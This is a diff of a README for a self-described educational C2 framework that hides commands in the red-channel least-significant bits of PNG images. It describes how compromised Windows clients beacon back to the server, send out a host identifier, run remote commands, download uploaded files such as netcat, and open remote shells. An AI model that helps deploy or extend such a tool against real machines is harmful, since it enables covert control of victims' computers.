@@ -1,16 +1,20 @@
 ### Summary
-The HTTPS C2 Server is a C2 framework that utilizes PNG images to establish command and control to deployed clients. I did this strictly for educational purposes in order to gain an understanding of how to develop C2 servers/clients at the system API level, as well as better prepare myself to defend agaisnt malicious threat actors. The C2 server was developed on Ubuntu and the C2 client was developed for Windows 10 OS. Both the C2 server and client were deveveloped in C++. Be aware that this is my first attempt at developing a project in C++, don't expect expert level code! XD
+The HTTPS C2 Server is a C2 framework that utilizes PNG images to establish command and control to deployed clients. I did this strictly for educational purposes in order to gain an understanding of how to develop C2 servers/clients at the system API level, as well as better prepare myself to defend agaisnt malicious threat actors. The C2 server was developed on Ubuntu and the C2 client was developed for Windows 10 OS. Both the C2 server and client were developed in C++. Be aware that this is my first attempt at developing a project in C++, don't expect expert level code! XD]
+
+The program flow itself is pretty simple. When a host is compromised with the HTTP-C2-Client binary it will first reach out to to the server to grab the default C2 image (default.png) via a HTTP GET request. It is just a picture of a tree. The client will then decode the image to grab the initialization commands. The only initialization commands currently available is a command to generate a unique client ID (UID) and a command to change the URL of the clients next GET request (The next image it will grab for commands). The UID is a concatenation of the compromised hosts MAC address and hostname. The client will then encode an image with the UID and send the encoded image to the server via an HTTP POST request. The server will decode the recieved image for the clients UID and update it's database of active clients. Next, the client will perform a GET request to the URL provided from the server (For now it is tree.png, this will be modifiable in future updates), and decode the image for new commands. If the image is not available from the server, an HTTP Status 400 error will be returned to the client (This just means the server has not issued any new commands). The client will then sleep for the time length of the beacon variable (default is 0) before re-trying another GET request for the image. If the GET request was successfull, the client will decode the image, process the image for new commands, and execute the commands.      
 
 View the following link to see the flow of the program. 
 
 [HTTPS-C2-Program-Flow](https://github.com/antroguy/HTTPS-C2-Server/tree/master/Documentation/C2_HTTPS_Program_Flow.pdf)
+
+I decided to use BGRA (Blue-Green-Red-Alpha) formatted PNG images for C2 for this project. BGRA PNG images consist of 32 bit pixels, 8 bits for each color/alpha. All commands and data are stored in the LSB of the red pixels. I could of probably stored the data in the alpha pixel, however storing the data in the red pixel bits showed no real visual change to the images. 
 
 ### QuickStart
 First clone the HTTPS-C2-Server repository from a Ubuntu VM:
 ```
 $ git clone https://github.com/antroguy/HTTPS-C2-Server
 ```
-Go to HTTPS-C2-Server/build and run the following command to start the server. The default port is 8080. A future update will allow you to specify the port and host address to bind. 
+Go to HTTPS-C2-Server/build and run the following command to start the server. The default port is 8080. A future update will allow you to specify the port and host address to bind.
 ```
 $ ./serverMain
 ```
@@ -31,22 +35,22 @@ The commands that are available are as follows:
 Lets go over the available options real quick.
 
 * **KILL** - This can be set to True or left blank. If True, the client will terminate the process after completing all the commands issued by the server. 
-  * Example: "Set KILL True".
+  * Example: "set KILL True".
  
 * **CONF** - Modify the variable of a client. The only supported variable at this time is beacon. To set the beacon time (How frequently the client reaches back to the server for commands), you will need to run the command "set CONF beacon-20000", where the variable 20000 is in milliseconds.
-  * Example: "Set CONF beacon-100"
+  * Example: "set CONF beacon-20000"
 
 * **EXEC** - Set the command to be executed on the client. This is a way to issue commands to the clients without establishing a remote shell.
-  * Example: "Set EXEC ipconfig".
+  * Example: "set EXEC ipconfig".
  
 * **UPLOAD** - Upload a file to the clients. Here you will need to set the full path of the file you want the clients to download.
-  * Example: "Set UPLOAD /tmp/netcat"
+  * Example: "set UPLOAD /tmp/netcat"
 
 * **ID** - Set the ID of the client you want to run the command. This can either be set to "ALL", for which every single client will process the commands, or you can set the ID to the ID number of a connected client. To see the IDs of all connected clients issue the command "bots".
-  * Example: "Set ID ALL" OR "Set ID 0".
+  * Example: "set ID ALL" OR "Set ID 0".
 
 * **SHELL** - Establish a remote shell to a client. For this option you will be setting the port that you want the client to connect to.
-  * Example: "Set SHELL 8888".
+  * Example: "set SHELL 8888".
 
 Once your server is up and running you will need to execute the C2-Client executeable on a windows device. First compile the Windows C2 client with the server IP modified to your hosts IP. Once you run the executeable on the compromised machine you should see the C2 client perform it's initiation sequence (Provides the server with it's unique Client ID).
 
@@ -56,7 +60,7 @@ If you type in the command "bots", the server will display all active bots with 
 
 ![alt text](https://github.com/antroguy/HTTPS-C2-Server/blob/master/Documentation/Bots_Command.PNG)
 
-For this example we will grab the ip configuration of the compromised host shown above. We will need to set the ID option as well as the EXEC option to the command we want to run. We will also sec the beacon timespan to 20 seconds. See example below.
+For this example we will grab the ip configuration of the compromised host shown above. We will need to set the ID option as well as the EXEC option to the command we want to run. We will also set the beacon timespan to 20 seconds. See example below.
 
 ![alt text](https://github.com/antroguy/HTTPS-C2-Server/blob/master/Documentation/Example_1.PNG)
 
@@ -64,11 +68,11 @@ Once the options are set, issue the command "run". This will encode an image wit
 
 ![alt text](https://github.com/antroguy/HTTPS-C2-Server/blob/master/Documentation/Output_Example.PNG)
 
-If we wanted to establish a remote shell to the compromised host we would need to set the SHELL option to the designated port we want the client to connect to. The ID option can not be set to "ALL" when establishin a remote shell, instead only one unique ID must be set. 
+If we wanted to establish a remote shell to the compromised host we will need to set the SHELL option to the designated port we want the client to connect to. The ID option can not be set to "ALL" when establishing a remote shell, instead only one unique ID must be set. 
 
 ![alt text](https://github.com/antroguy/HTTPS-C2-Server/blob/master/Documentation/Shell_Example.PNG)
 
-Once ready type in the "run" command. A handler will be setup on the designated port waiting for the clients incoming connection. Once you are done witht he shell, simply type "exit" into the terminal to exit the remote session. 
+Once ready type in the "run" command. A handler will be setup on the designated port waiting for the clients incoming connection. Once you are done with the shell, simply type "exit" into the terminal to exit the remote session. 
 
 ![alt text](https://github.com/antroguy/HTTPS-C2-Server/blob/master/Documentation/Shell_Example2.PNG)
 
